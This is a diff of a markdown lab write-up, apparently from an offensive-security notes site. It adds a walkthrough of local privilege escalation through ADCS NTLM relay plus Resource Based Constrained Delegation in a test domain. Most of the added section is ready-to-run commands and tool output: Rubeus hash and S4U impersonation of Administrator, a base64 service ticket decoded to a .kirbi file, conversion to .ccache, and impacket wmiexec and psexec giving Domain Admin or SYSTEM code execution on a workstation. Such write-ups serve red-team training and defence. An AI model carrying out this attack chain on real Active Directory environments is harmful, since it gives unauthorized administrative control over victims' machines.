@@ -378,9 +378,21 @@ Below shows `WebClient` service is not running on `WS01` and we cannot start it,
 
 ## RBCD: Local Computer Take Over / Local Privilege Escalation
 
-{% hint style="info" %}
-WIP
-{% endhint %}
+It's also possible to leverage the ADCS NTLM relay + Resource Based Constrained Delegation \(RBCD\) to escalate privileges on a local computer, if regular domain users can create new machine/computer accounts in AD, which they are by default, as specified in the domain root object's attribute `ms-DS-MachineAccountQuota: 10`, as seen below:
+
+![Regular users can add up to 10 machine accounts in the domain by default](../../.gitbook/assets/image%20%281063%29.png)
+
+### Lab Setup
+
+This part of the lab is setup with the following computers and servers:
+
+* 10.0.0.5 - Kali box with NTLM relay;
+* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for privilege escalation, so that we can execute code on it from 10.0.0.5 via wmiexec / psexec with Domain Admin privileges;
+* 10.0.0.6 - Domain Controller `DC01`;
+
+### Calculating Hash
+
+Building on the previous successful NTLM relay, where we forced the `WS01$` to authenticate to our Kali box \(where NTLM relay was listening\), we got a new machine account `QUAIIVVE$` created with a password ``K_-Jzsb&uK!`TIH``. Let's again calculate the password hash for it:
 
 ```text
 PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:"K_-Jzsb&uK!``TIH"
@@ -407,7 +419,11 @@ PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAI
 [*]       des_cbc_md5          : A8B625105779671C
 ```
 
-![](../../.gitbook/assets/image%20%281058%29.png)
+![Password hash calculations](../../.gitbook/assets/image%20%281058%29.png)
+
+### Impersonating Domain Admin on WS01
+
+We can now perform the S4U against `WS01`, where we currently have low privileged access, but want to elevate to Domain Admin privileges on that machine:
 
 ```text
 PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69 /impersonateuser:Administrator /msdsspn:host/ws01.offense.local /altservice:cifs /nowrap /ptt
@@ -455,37 +471,57 @@ PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A0
 [+] Ticket successfully imported!
 ```
 
-![](../../.gitbook/assets/image%20%281061%29.png)
+Above and below shows how a TGS for `administrator@offense.local` is granted access to `cifs/ws01.offense.local`:
+
+![TGS for administrator@offense.local issued to access cifs/ws01.offense.local](../../.gitbook/assets/image%20%281061%29.png)
+
+### Decoding TGS to .kirbi
+
+On a Kali box, let's base64 decode the TGS we got for `administrator@offense.local` to `cifs/ws01.offense.local` and save it as `admin.kirbi`:
 
 ```text
 echo "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" | base64 -d > admin.kirbi
 ```
 
-![](../../.gitbook/assets/image%20%281062%29.png)
+![TGS base64 decoded and saved to a kirbi file](../../.gitbook/assets/image%20%281062%29.png)
+
+### Converting .kirbi Ticket to .ccache
+
+We can now use impacket's tool ticketConverter to convert the `.kirbi` file to `.ccache` file like so:
 
 ```text
 examples/ticketConverter.py ../admin.kirbi admin.ccache
 ```
 
-![](../../.gitbook/assets/image%20%281056%29.png)
+![Converting .kirbi to .ccache](../../.gitbook/assets/image%20%281056%29.png)
+
+### Exporting KRB5CCNAME
+
+Now we need to export the `KRB5CCNAME` variable and point it to our `admin.ccache` file:
 
 ```text
 export KRB5CCNAME=admin.ccache
 ```
 
-![](../../.gitbook/assets/image%20%281057%29.png)
+![KRB5CCNAME variable exported](../../.gitbook/assets/image%20%281057%29.png)
+
+### Executing Code as Domain Admin on WS01
+
+We can now use impacket's `wmiexec` to execute commands on `WS01` with Domain Admin privileges:
 
 ```text
 examples/wmiexec.py -k -no-pass offense.local/administrator@ws01.offense.local
 ```
 
-![](../../.gitbook/assets/rbcd-local-privilege-escalation.gif)
+![Code execution on WS01 as offense\administrator](../../.gitbook/assets/rbcd-local-privilege-escalation.gif)
 
-![](../../.gitbook/assets/image%20%281060%29.png)
+Privileged code execution on `WS01` can also be achieved using impacket's psexec:
+
+![psexec executes code on ws01 from 10.0.0.5 with SYSTEM privileges](../../.gitbook/assets/image%20%281060%29.png)
 
 {% hint style="info" %}
 * This attack could also be performed by leveraging compromised user that has an SPN set.
-* This attack could be performed via socks proxy and remote port forwarding as described [here](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/).
+* This attack could be performed via socks proxy and remote port forwarding as described [here](https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/), which reduces the need to have a Linux box inside the compromised network which an NTLM relay listener set up.
 {% endhint %}
 
 ## References
